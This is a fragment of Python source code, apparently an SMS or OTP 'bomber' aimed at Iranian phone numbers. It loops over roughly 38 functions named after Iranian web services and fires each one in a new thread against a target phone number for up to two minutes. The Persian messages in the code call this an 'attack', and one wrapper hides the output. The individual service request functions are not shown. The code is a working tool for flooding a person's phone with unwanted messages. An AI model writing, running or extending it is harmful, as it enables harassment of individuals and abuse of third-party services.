...
w='\033[1;37m'
ALL_SERVICES = [
    snap, gap, tap30, divar, torob, snapfood, sheypoor, okorosh, 
    alibaba, smarket, gapfilm, sTrip, filmnet, drdr, itool, anar, 
    azki, chmdon, bn, lendo, olgoo, pakhsh, didnegar, nobat, 
    baskol, basalam, ghabzino, bimito, bimitoVip, seebirani, limome, 
    binjo, kilid, drsaina, simkhanT, simkhanF, mihanpezeshk, mek
]
def _actual_run_bomber_logic(phone, duration_seconds=60, sleep_time=0.0001):
    
    internal_phone = phone.replace(' ', '').replace('+', '').lstrip('0')
    if not internal_phone.startswith('98'):
        internal_phone = '98' + internal_phone
    internal_phone = '+' + internal_phone
    
    start_time = time.time()
    end_time = start_time + duration_seconds
    print(f"شروع حمله به {phone} برای {duration_seconds} ثانیه...") 

    try:
        while time.time() < end_time:
            for service_func in ALL_SERVICES:
                Thread(target=service_func, args=[internal_phone]).start() 
                sleep(sleep_time) 
                
    except Exception as e:
        print(f"خطای داخلی در اجرای بمبر: {e}")
        return False
    finally:
        print(f"پایان حمله به {phone} بعد از {duration_seconds} ثانیه.")
        return True
def run_bomber_directly(phone, duration_seconds=60, sleep_time=0.1):
    with redirect_stdout(DevNull()):
        return _actual_run_bomber_logic(phone, duration_seconds, sleep_time)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        phone = sys.argv[1]
        _actual_run_bomber_logic(phone, duration_seconds=120)